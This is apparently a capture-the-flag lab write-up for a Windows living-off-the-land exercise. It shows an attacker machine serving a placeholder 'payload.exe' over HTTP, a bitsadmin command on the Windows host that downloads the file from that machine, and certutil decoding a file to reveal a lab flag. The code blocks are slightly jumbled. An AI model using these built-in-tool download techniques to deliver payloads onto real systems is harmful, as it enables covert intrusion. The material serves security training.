# Room Information

# Room Tasks

## File Operations

### BITSAdmin

```Bash
root@ip-10-10-181-22:~# touch payload.exe
```

```Bash
root@ip-10-10-181-22:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```CMD
DISPLAY: '/Download' TYPE: DOWNLOAD STATE: TRANSFERRED
PRIORITY: FOREGROUND FILES: 1 / 1 BYTES: 0 / 0 (0%)
Transfer complete.

```Bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.168.70 - - [19/Aug/2023 21:08:46] "HEAD /payload.exe HTTP/1.1" 200 -
```
C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://10.10.181.22:8000/payload.exe c:\Users\thm\Desktop\payload.exe
```

```CMD
C:\Users\thm>certutil -decode C:\Users\thm\Desktop\enc_thm_0YmFiOG_file.txt Output.txt
Input Length = 52
Output Length = 38
CertUtil: -decode command completed successfully.
```

```CMD
C:\Users\thm>type Output.txt
THM{ea4e2b9f362320d098635d4bab8a568e}
```

## File Execution
